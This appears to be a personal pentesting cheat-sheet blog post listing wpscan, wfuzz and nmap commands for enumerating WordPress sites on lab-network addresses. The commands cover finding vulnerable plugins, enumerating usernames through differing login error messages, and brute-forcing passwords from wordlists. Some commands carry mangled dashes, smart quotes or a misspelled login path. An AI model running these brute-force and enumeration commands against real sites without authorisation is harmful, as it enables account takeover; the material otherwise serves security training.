---
layout: post
title: wpscan
description: WordPress scanner 
date: 2022-04-09
---

wpscan --url https://192.168.26.141:12380/blogblog  <--this will give you basic information about wordpress

wpscan --url https://192.168.26.141:12380/blogblog --enumerate vp    <---this will give you information on vulnerable plugins

wpscan --url https://192.168.26.141:12380/blogblog --enumerate at    <---enumerate all things

wpscan -u http://192.168.0.14/ –wordlist /root/Dropbox/Vulnhub/MrRobot/fsocity.dic –username elliot

wpscan --url http://10.11.1.234 -t 20 -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -U users.txt  <----this will bruteforce passwords :)

* * *

The interesting this about the wordpress login was you get a different error depending on which boxes are filled out.

If your user name is wrong the response contains Invalid

If your password is wrong it contains incorrect

Starting with the user name

```
wfuzz -c -z file,/root/Documents/MrRobot/fsoc.dic — hs Invalid -d “log=FUZZ&pwd=aaaaa” http://192.168.240.129/wo-login.php
```

* * *

nmap -sV --script http-wordpress-enum 10.11.1.234   if ping probes are blocked, use -Pn rather that -sV

nmap -Pn --script http-wordpress-enum --script-args check-latest=true,search-limit=10 10.11.1.234

nmap -sV 10.11.1.234 --script http-wordpress-enum --script-args limit=25